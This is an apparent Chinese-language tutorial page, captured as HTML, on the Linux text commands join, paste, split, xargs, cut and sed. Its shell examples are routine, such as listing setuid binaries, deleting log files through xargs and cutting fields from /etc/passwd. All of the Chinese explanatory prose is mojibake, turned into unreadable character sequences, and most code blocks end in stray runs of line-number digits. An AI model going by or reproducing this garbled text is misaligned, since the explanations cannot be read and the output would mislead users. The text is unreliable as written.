<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_1 testfile_2 #è¿æ¥testfile_1ã€testfile_2ä¸­çš„å†…å®¹  </span><br><span class="line">Hello 95 2005 #è¿æ¥åæ˜¾ç¤ºçš„å†…å®¹  </span><br><span class="line">Linux 85 2009  </span><br><span class="line"><span class="keyword">test </span>30 2006 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªæ–‡ä»¶äº’æ¢ï¼Œè¾“å‡ºç»“æœçš„å˜åŒ–ï¼š</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_2 testfile_1 #æ”¹å˜æ–‡ä»¶é¡ºåºè¿æ¥ä¸¤ä¸ªæ–‡ä»¶  </span><br><span class="line">Hello 2005 95 #è¿æ¥åæ˜¾ç¤ºçš„å†…å®¹  </span><br><span class="line">Linux 2009 85  </span><br><span class="line"><span class="keyword">test </span>2006 30 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a&lt;1æˆ–2&gt; é™¤äº†æ˜¾ç¤ºåŸæ¥çš„è¾“å‡ºå†…å®¹ä¹‹å¤–ï¼Œè¿˜æ˜¾ç¤ºæŒ‡ä»¤æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸åŒæ ä½çš„è¡Œã€‚</p>
</li>
<li class="lvl-2">
<p>-e&lt;å­—ç¬¦ä¸²&gt; è‹¥[æ–‡ä»¶1]ä¸[æ–‡ä»¶2]ä¸­æ‰¾ä¸åˆ°æŒ‡å®šçš„æ ä½ï¼Œåˆ™åœ¨è¾“å‡ºä¸­å¡«å…¥é€‰é¡¹ä¸­çš„å­—ç¬¦ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p>-iæˆ–â€“igore-case æ¯”è¾ƒæ ä½å†…å®¹æ—¶ï¼Œå¿½ç•¥å¤§å°å†™çš„å·®å¼‚ã€‚</p>
</li>
<li class="lvl-2">
<p>-o&lt;æ ¼å¼&gt; æŒ‰ç…§æŒ‡å®šçš„æ ¼å¼æ¥æ˜¾ç¤ºç»“æœã€‚</p>
</li>
<li class="lvl-2">
<p>-t&lt;å­—ç¬¦&gt; ä½¿ç”¨æ ä½çš„åˆ†éš”å­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>-v&lt;1æˆ–2&gt; è·Ÿ-aç›¸åŒï¼Œä½†æ˜¯åªæ˜¾ç¤ºæ–‡ä»¶ä¸­æ²¡æœ‰ç›¸åŒæ ä½çš„è¡Œã€‚</p>
</li>
<li class="lvl-2">
<p>-1&lt;æ ä½&gt; è¿æ¥[æ–‡ä»¶1]æŒ‡å®šçš„æ ä½ã€‚</p>
</li>
<li class="lvl-2">
<p>-2&lt;æ ä½&gt; è¿æ¥[æ–‡ä»¶2]æŒ‡å®šçš„æ ä½ã€‚</p>
</li>
</ul>
<h4 id="paste-å°†å¤šä¸ªæ–‡ä»¶å¯¹åº”è¡Œé“¾æ¥åœ¨ä¸€èµ·">paste-å°†å¤šä¸ªæ–‡ä»¶å¯¹åº”è¡Œé“¾æ¥åœ¨ä¸€èµ·</h4>
<p>paste æŒ‡ä»¤ä¼šæŠŠæ¯ä¸ªæ–‡ä»¶ä»¥åˆ—å¯¹åˆ—çš„æ–¹å¼ï¼Œä¸€åˆ—åˆ—åœ°åŠ ä»¥åˆå¹¶ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">paste <span class="selector-attr">[-s]</span><span class="selector-attr">[-d &lt;é—´éš”å­—ç¬¦&gt;]</span><span class="selector-attr">[æ–‡ä»¶...]</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d&lt;é—´éš”å­—ç¬¦&gt;æˆ–â€“delimiters=&lt;é—´éš”å­—ç¬¦&gt; ã€€ç”¨æŒ‡å®šçš„é—´éš”å­—ç¬¦å–ä»£è·³æ ¼å­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>-sæˆ–â€“serial ã€€ä¸²åˆ—è¿›è¡Œè€Œéå¹³è¡Œå¤„ç†ã€‚</p>
</li>
<li class="lvl-2">
<p>[æ–‡ä»¶â€¦] æŒ‡å®šæ“ä½œçš„æ–‡ä»¶è·¯å¾„</p>
</li>
</ul>
<p>ä½¿ç”¨pasteæŒ‡ä»¤å°†æ–‡ä»¶&quot;file&quot;ã€â€œtestfileâ€ã€&quot;testfile1&quot;è¿›è¡Œåˆå¹¶ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file                  <span class="comment">#fileæ–‡ä»¶çš„å†…å®¹</span></span>  </span><br><span class="line">xiongdan 200  </span><br><span class="line">lihaihui 233  </span><br><span class="line">lymlrl 231  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile              <span class="comment">#testfileæ–‡ä»¶çš„å†…å®¹</span></span>  </span><br><span class="line">liangyuanm  ss  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile1             <span class="comment">#testfile1æ–‡ä»¶çš„å†…å®¹</span></span>  </span><br><span class="line">huanggai 56  </span><br><span class="line">zhixi 73 </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200    liangyuanm ss   huanggai 56</span><br><span class="line">lihaihui 233            zhixi 73</span><br><span class="line">lymlrl 231</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> -d <span class="string">&#x27;:&#x27;</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200:liangyuanm ss:huanggai 56</span><br><span class="line">lihaihui 233::zhixi 73</span><br><span class="line">lymlrl 231::</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure>
<p>å‚æ•°&quot;-s&quot;å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å¤šè¡Œæ•°æ®åˆå¹¶ä¸ºä¸€è¡Œè¿›è¡Œæ˜¾ç¤ºï¼š</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ paste -s file             <span class="comment">#åˆå¹¶æŒ‡å®šæ–‡ä»¶çš„å¤šè¡Œæ•°æ®</span></span><br><span class="line">xiongdan<span class="number"> 200 </span>lihaihui<span class="number"> 233 </span>lymlrl<span class="number"> 231 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå°†æ–‡ä»¶ä½ç½®æ”¹ä¸º-ï¼Œè¡¨ç¤ºæ¥æ”¶æ ‡å‡†è¾“å…¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file |<span class="built_in">paste</span> testfile1 -</span></span><br><span class="line">huanggai 56     xiongdan 200</span><br><span class="line">zhixi 73        lihaihui 233</span><br><span class="line">        lymlrl 231</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="split-æ–‡ä»¶åˆ‡å‰²">split - æ–‡ä»¶åˆ‡å‰²</h4>
<p>splitå‘½ä»¤ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶åˆ†å‰²æˆæ•°ä¸ªã€‚</p>
<p>è¯¥æŒ‡ä»¤å°†å¤§æ–‡ä»¶åˆ†å‰²æˆè¾ƒå°çš„æ–‡ä»¶ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹å°†æŒ‰ç…§æ¯1000è¡Œåˆ‡å‰²æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">split [-<span class="keyword">bl] </span>file <span class="keyword">prefix</span></span><br><span class="line"><span class="keyword"></span>-<span class="keyword">b: </span>ä»¥å¤§å°åˆ‡å‰²</span><br><span class="line">-lï¼šä»¥è¡Œæ•°åˆ‡å‰²</span><br><span class="line"><span class="keyword">prefixï¼šåˆ‡å‰²åæ–‡ä»¶çš„å‰ç¼€</span></span><br><span class="line"><span class="keyword"></span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-&lt;è¡Œæ•°&gt; : æŒ‡å®šæ¯å¤šå°‘è¡Œåˆ‡æˆä¸€ä¸ªå°æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-b&lt;å­—èŠ‚&gt; : æŒ‡å®šæ¯å¤šå°‘å­—èŠ‚åˆ‡æˆä¸€ä¸ªå°æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-C&lt;å­—èŠ‚&gt; : ä¸å‚æ•°&quot;-b&quot;ç›¸ä¼¼ï¼Œä½†æ˜¯åœ¨åˆ‡ å‰²æ—¶å°†å°½é‡ç»´æŒæ¯è¡Œçš„å®Œæ•´æ€§</p>
</li>
<li class="lvl-2">
<p>[è¾“å‡ºæ–‡ä»¶å] : è®¾ç½®åˆ‡å‰²åæ–‡ä»¶çš„å‰ç½®æ–‡ä»¶åï¼Œ splitä¼šè‡ªåŠ¨åœ¨å‰ç½®æ–‡ä»¶ååå†åŠ ä¸Šç¼–å·</p>
</li>
</ul>
<p>ä½¿ç”¨æŒ‡ä»¤&quot;split&quot;å°†æ–‡ä»¶&quot;README&quot;æ¯6è¡Œåˆ‡å‰²æˆä¸€ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">split</span> -6 README       <span class="comment">#å°†READMEæ–‡ä»¶æ¯å…­è¡Œåˆ†å‰²æˆä¸€ä¸ªæ–‡ä»¶</span></span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span>                                <span class="comment">#æ‰§è¡ŒlsæŒ‡ä»¤</span></span>  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">è·å¾—å½“å‰ç›®å½•ç»“æ„</span></span><br><span class="line">README xaa xad xag xab xae xah xac xaf xai</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šå‘½ä»¤æ‰§è¡Œåï¼ŒæŒ‡ä»¤&quot;split&quot;ä¼šå°†åŸæ¥çš„å¤§æ–‡ä»¶&quot;README&quot;åˆ‡å‰²æˆå¤šä¸ªä»¥&quot;x&quot;å¼€å¤´çš„å°æ–‡ä»¶ã€‚è€Œåœ¨è¿™äº›å°æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½åªæœ‰6è¡Œå†…å®¹ã€‚</p>
<p>ä»¥å¤§å°åˆ‡å‰²ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ split -<span class="keyword">b </span><span class="number">50</span>m <span class="keyword">disease.dmp </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp*</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpaa</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpab</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">22</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpac</span></span><br><span class="line"><span class="keyword"></span><span class="number">12345678</span></span><br></pre></td></tr></table></figure>
<h4 id="xargs-å‚æ•°ä»£æ¢">xargs - å‚æ•°ä»£æ¢</h4>
<p>ä¸æ˜¯æ‰€æœ‰çš„å‘½ä»¤éƒ½æ”¯æŒç®¡é“ï¼Œå¦‚lsï¼Œå¯¹äºä¸æ”¯æŒç®¡é“çš„å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡xargsè®©å…¶æœ‰ç®¡é“å‘½ä»¤çš„æ•ˆæœï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find /sbin -perm +7000 | xargs ls -l</span></span><br><span class="line">-rwsr-x---<span class="number"> 1 </span>root ecryptfs<span class="number"> 19896 </span>Feb<span class="number"> 23 </span><span class="number"> 2012 </span>/sbin/mount.ecryptfs_private</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75496 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs4</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root root     <span class="number"> 8544 </span>Feb<span class="number"> 22 </span><span class="number"> 2012 </span>/sbin/netreport</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 14112 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/pam_timestamp_check</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/umount.nfs4</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 19768 </span>Nov <span class="number"> 2 </span><span class="number"> 2010 </span>/sbin/unix_chkpwd</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ²¡æœ‰xargsï¼Œls -lçš„ç»“æœå°†ä¸æ˜¯å‰é¢findçš„æ ‡å‡†è¾“å‡ºï¼Œå› ä¸ºlsä¸æ”¯æŒç®¡é“å‘½ä»¤ã€‚</p>
<p>xargs ç”¨ä½œæ›¿æ¢å·¥å…·ï¼Œè¯»å–è¾“å…¥æ•°æ®é‡æ–°æ ¼å¼åŒ–åè¾“å‡ºã€‚</p>
<p>å®šä¹‰ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œå†…æœ‰å¤šè¡Œæ–‡æœ¬æ•°æ®ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># cat test<span class="selector-class">.txt</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> c d e f <span class="selector-tag">g</span></span><br><span class="line">h <span class="selector-tag">i</span> j k l m n</span><br><span class="line">o <span class="selector-tag">p</span> <span class="selector-tag">q</span></span><br><span class="line"><span class="attribute">r</span> s t</span><br><span class="line">u v w <span class="attribute">x</span> <span class="attribute">y</span> z</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>å¤šè¡Œè¾“å…¥å•è¡Œè¾“å‡ºï¼š</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span> <span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span> <span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span> <span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span> <span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span> <span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span> <span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span> <span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span> <span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>-n é€‰é¡¹å¤šè¡Œè¾“å‡ºï¼š</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"># <span class="selector-tag">cat</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span> <span class="selector-tag">-n3</span></span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-tag">b</span> <span class="selector-tag">c</span></span><br><span class="line"><span class="selector-tag">d</span> <span class="selector-tag">e</span> <span class="selector-tag">f</span></span><br><span class="line"><span class="selector-tag">g</span> <span class="selector-tag">h</span> <span class="selector-tag">i</span></span><br><span class="line"><span class="selector-tag">j</span> <span class="selector-tag">k</span> <span class="selector-tag">l</span></span><br><span class="line"><span class="selector-tag">m</span> <span class="selector-tag">n</span> <span class="selector-tag">o</span></span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-tag">q</span> <span class="selector-tag">r</span></span><br><span class="line"><span class="selector-tag">s</span> <span class="selector-tag">t</span> <span class="selector-tag">u</span></span><br><span class="line"><span class="selector-tag">v</span> <span class="selector-tag">w</span> <span class="selector-tag">x</span></span><br><span class="line"><span class="selector-tag">y</span> <span class="selector-tag">z</span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<p>-d é€‰é¡¹å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªå®šç•Œç¬¦ï¼š</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>ç»“åˆ -n é€‰é¡¹ä½¿ç”¨ï¼š</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta"># echo <span class="string">&quot;nameXnameXnameXname&quot;</span> | xargs -dX -n2</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="built_in">name</span> <span class="built_in">name</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>è¯»å– stdinï¼Œå°†æ ¼å¼åŒ–åçš„å‚æ•°ä¼ é€’ç»™å‘½ä»¤:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> sk.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sk.shå‘½ä»¤å†…å®¹ï¼Œæ‰“å°å‡ºæ‰€æœ‰å‚æ•°ã€‚</span></span><br><span class="line">echo $*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt</span></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> arg.txt | xargs -I &#123;&#125; ./sk.sh -p &#123;&#125; -l</span></span><br><span class="line">-p aaa -l</span><br><span class="line">-p bbb -l</span><br><span class="line">-p ccc -l</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹<code>-I</code>æŒ‡å®šä¸€ä¸ªæ›¿æ¢å­—ç¬¦ä¸² {}ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åœ¨ xargs æ‰©å±•æ—¶ä¼šè¢«æ›¿æ¢æ‰ã€‚</p>
<p>å¤åˆ¶æ‰€æœ‰å›¾ç‰‡æ–‡ä»¶åˆ° /data/images ç›®å½•ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.jpg | xargs -n1 -I &#123;&#125; <span class="built_in">cp</span> &#123;&#125; /data/images</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹<code>-n</code> åé¢åŠ æ¬¡æ•°ï¼Œè¡¨ç¤ºå‘½ä»¤åœ¨æ‰§è¡Œçš„æ—¶å€™ä¸€æ¬¡ç”¨çš„argumentçš„ä¸ªæ•°ï¼Œé»˜è®¤æ˜¯ç”¨æ‰€æœ‰çš„ã€‚</p>
<p><strong>xargs ç»“åˆ find ä½¿ç”¨</strong></p>
<p>ç”¨ rm åˆ é™¤å¤ªå¤šçš„æ–‡ä»¶æ—¶å€™ï¼Œå¯èƒ½å¾—åˆ°ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š<strong>/bin/rm Argument list too long.</strong> ç”¨ xargs å»é¿å…è¿™ä¸ªé—®é¢˜ï¼š</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.log&quot;</span> -print0 | xargs -<span class="number">0</span> rm -f</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>xargs -0 å°† \0 ä½œä¸ºå®šç•Œç¬¦ã€‚</p>
<p>ç»Ÿè®¡ä¸€ä¸ªæºä»£ç ç›®å½•ä¸­æ‰€æœ‰ php æ–‡ä»¶çš„è¡Œæ•°ï¼š</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -<span class="number">0</span> wc -l</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾æ‰€æœ‰çš„ jpg æ–‡ä»¶ï¼Œå¹¶ä¸”å‹ç¼©å®ƒä»¬ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -type f -name <span class="string">&quot;*.jpg&quot;</span> -<span class="built_in">print</span> | xargs tar -czvf images.tar.gz</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>æ‰¹é‡ä¸‹è½½ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> url-list.txt | xargs wget -c</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>wgetçš„<code>-c</code>é€‰é¡¹è¡¨ç¤ºæ–­ç‚¹ç»­ä¼ ã€‚</p>
<h2 id="æ–‡æœ¬ç¼–è¾‘å‘½ä»¤">æ–‡æœ¬ç¼–è¾‘å‘½ä»¤</h2>
<h3 id="cutå‘½ä»¤">cutå‘½ä»¤</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹ä¸å‚æ•°ï¼š</span><br><span class="line">-d  ï¼šåé¢æ¥åˆ†éš”å­—ç¬¦ã€‚ä¸ -f ä¸€èµ·ä½¿ç”¨ï¼›</span><br><span class="line">-f  ï¼šä¾æ® -d çš„åˆ†éš”å­—ç¬¦å°†ä¸€æ®µä¿¡æ¯åˆ†å‰²æˆä¸ºæ•°æ®µï¼Œç”¨ -f å–å‡ºç¬¬å‡ æ®µçš„æ„æ€ï¼›</span><br><span class="line">-c  ï¼šä»¥å­—ç¬¦ (characters) çš„å•ä½å–å‡ºå›ºå®šå­—ç¬¦åŒºé—´ï¼›</span><br></pre></td></tr></table></figure>
<p>cutä»¥è¡Œä¸ºå•ä½ï¼Œæ ¹æ®åˆ†éš”ç¬¦æŠŠè¡Œåˆ†æˆè‹¥å¹²åˆ—ï¼Œè¿™æ ·å°±å¯ä»¥æŒ‡å®šé€‰å–å“ªäº›åˆ—äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;åˆ†éš”å­—ç¬¦&#x27;</span> -f é€‰å–çš„åˆ—æ•°</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--é€‰å–ç¬¬2åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--é€‰å–ç¬¬3åˆ—å’Œç¬¬5åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--é€‰å–ç¬¬3åˆ—åˆ°ç¬¬5åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--é€‰å–ç¬¬3åˆ—åˆ°æœ€å1åˆ—</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--é€‰å–ç¬¬1åˆ°ç¬¬3åˆ—è¿˜æœ‰ç¬¬5åˆ—</span><br></pre></td></tr></table></figure>
<p>åªæ˜¾ç¤º/etc/passwdçš„ç”¨æˆ·å’Œshellï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat /etc/passwd | cut -d &#x27;:&#x27; -f 1,7 </span></span><br><span class="line">root:/bin/bash</span><br><span class="line">daemon:/bin/sh</span><br><span class="line">bin:/bin/sh</span><br></pre></td></tr></table></figure>
<h3 id="sedå‘½ä»¤">sedå‘½ä»¤</h3>
<p>sed å¯ä¾ç…§è„šæœ¬çš„æŒ‡ä»¤æ¥å¤„ç†ã€ç¼–è¾‘æ–‡æœ¬æ–‡ä»¶ã€‚</p>
<p>Sed ä¸»è¦ç”¨æ¥è‡ªåŠ¨ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€ç®€åŒ–å¯¹æ–‡ä»¶çš„åå¤æ“ä½œã€ç¼–å†™è½¬æ¢ç¨‹åºç­‰ã€‚</p>
<p>è¯­æ³•:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [-e&lt;script&gt;][-f&lt;scriptæ–‡ä»¶&gt;][æ–‡æœ¬æ–‡ä»¶]</span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>-e &lt;script&gt;</code>ä»¥æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><code>-f&lt;scriptæ–‡ä»¶&gt;</code>ä»¥æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><code>-n</code>ä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœï¼Œä¸€èˆ¬è·ŸpåŠ¨ä½œæ­é…ä½¿ç”¨ã€‚</p>
</li>
<li class="lvl-2">
<p><code>-i</code>ä½¿ç”¨å¤„ç†åçš„ç»“æœä¿®æ”¹æ–‡ä»¶ã€‚</p>
</li>
</ul>
<p><strong>åŠ¨ä½œè¯´æ˜</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>aï¼šåœ¨æŒ‡å®šè¡Œåé¢æ’å…¥å†…å®¹</p>
</li>
<li class="lvl-2">
<p>iï¼šåœ¨æŒ‡å®šè¡Œå‰é¢æ’å…¥å†…å®¹</p>
</li>
<li class="lvl-2">
<p>dï¼šåˆ é™¤æŒ‡å®šè¡Œ</p>
</li>
<li class="lvl-2">
<p>c ï¼šæ›¿æ¢æŒ‡å®šè¡Œ</p>
</li>
<li class="lvl-2">
<p>p ï¼šæ‰“å°æŒ‡å®šè¡Œçš„æ•°æ®ï¼Œé€šå¸¸éœ€è¦è·Ÿ<code>-n</code>é€‰é¡¹æ­é…ä½¿ç”¨</p>
</li>
<li class="lvl-2">
<p>s ï¼šæ›¿æ¢æŒ‡å®šå­—ç¬¦ï¼Œå…¼å®¹vimçš„æ›¿æ¢è¯­æ³•ï¼Œä¾‹å¦‚ 1,20s/old/new/g</p>
</li>
</ul>
<h4 id="å…ƒå­—ç¬¦é›†">å…ƒå­—ç¬¦é›†</h4>
